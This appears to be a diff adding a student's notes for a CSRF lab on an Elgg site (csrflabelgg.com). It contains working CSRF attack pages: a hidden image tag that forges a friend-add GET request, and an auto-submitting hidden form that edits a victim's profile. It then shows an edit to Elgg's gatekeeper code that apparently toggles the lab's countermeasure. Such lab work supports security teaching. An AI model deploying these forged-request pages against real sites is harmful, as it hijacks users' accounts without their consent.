@@ -1,0 +1,59 @@
+2nd...
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Exciting News!</title>
+  </head>
+  <body>
+    <!-- Silent CSRF GET request via img tag -->
+    <img src="http://www.csrflabelgg.com/action/friends/add?friend=43" style="display:none" />
+    <!-- Replace 42 with Boby's real user ID -->
+  </body>
+</html>
+
+
+
+3rd....
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Honeypot</title>
+</head>
+<body>
+  <h1>This page forges an HTTP POST request.</h1>
+
+  <!-- JavaScript method-->
+  <script type="text/javascript">
+    function forge_post() {
+      var fields;
+
+      fields = "<input type='hidden' name='name' value='Alice'>";
+      fields += "<input type='hidden' name='description'  value='SAMY is MY HERO'>";
+      fields += "<input type='hidden' name='accesslevel[description]' value='2'>";
+      fields += "<input type='hidden' name='guid' value='42'>";
+
+      var p = document.createElement("form");
+      p.action = "http://www.csrflabelgg.com/action/profile/edit";
+      p.innerHTML = fields;
+      p.method = "post";
+      document.body.appendChild(p);
+      p.submit();
+    }
+    /* Run the function automatically when the webpage is loaded */
+    window.onload = function () { forge_post(); }
+  </script>
+</body>
+
+</html>
+
+4th.....
+sudo nano /var/www/CSRF/Elgg/vendor/elgg/elgg/engine/classes/Elgg/ActionsService.php
+
+
+
+Comment out return true; like this:
+
+public function gatekeeper($action) {
+    // return true;
+    ...
+}
